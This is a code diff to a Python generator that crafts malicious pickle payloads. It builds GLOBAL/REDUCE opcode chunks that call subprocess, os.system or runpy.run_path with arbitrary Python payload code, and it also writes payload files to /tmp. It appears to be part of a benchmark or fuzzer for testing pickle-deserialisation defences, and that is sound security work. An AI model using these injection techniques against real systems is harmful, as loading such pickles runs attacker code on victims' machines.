@@ -124,19 +124,34 @@ class CandidateGenerator:
         else:
             module, name = dangerous_callable
 
-        # 3. Build the malicious injection chunk
-        # Format: c<module>\n<name>\n(S'<payload_code>'\ntR0
+        # 3. Build the malicious injection chunk dynamically based on callable arguments
         injection_parts = []
         
         # c<module>\n<name>\n
         injection_parts.append(OPCODES_BY_NAME["GLOBAL"].code)
         injection_parts.append(f"{module}\n{name}\n".encode("latin1"))
         
-        # (S'<payload_code>'\ntR
-        injection_parts.append(OPCODES_BY_NAME["MARK"].code)
-        injection_parts.append(OPCODES_BY_NAME["SHORT_BINSTRING"].code)
-        injection_parts.append(bytes([len(payload_code)]) + payload_code.encode("utf-8"))
-        injection_parts.append(OPCODES_BY_NAME["TUPLE"].code)
+        # Generate fuzzed arguments tuple matching the callable
+        if module == "subprocess" and name in ("Popen", "run", "call", "check_call", "check_output"):
+            args = (("python3", "-c", payload_code),)
+        elif module == "subprocess" and name in ("getstatusoutput", "getoutput"):
+            args = (f"python3 -c {payload_code!r}",)
+        elif name == "system" and module in ("os", "posix", "nt", "IPython.utils.process"):
+            args = (f"python3 -c {payload_code!r}",)
+        elif module == "runpy" and name == "run_path":
+            # Write payload to a shared /tmp file so the container can execute it
+            path = "/tmp/regenbench_payload.py"
+            try:
+                with open(path, "w") as f:
+                    f.write(payload_code)
+            except OSError:
+                pass
+            args = (path,)
+        else:
+            args = (payload_code,)
+            
+        args_bytes = pickle.dumps(args, protocol=2)[2:-1]  # Strip PROTO and STOP
+        injection_parts.append(args_bytes)
         injection_parts.append(OPCODES_BY_NAME["REDUCE"].code)
         
         # 0 (POP returned result from stack to maintain stack stability)
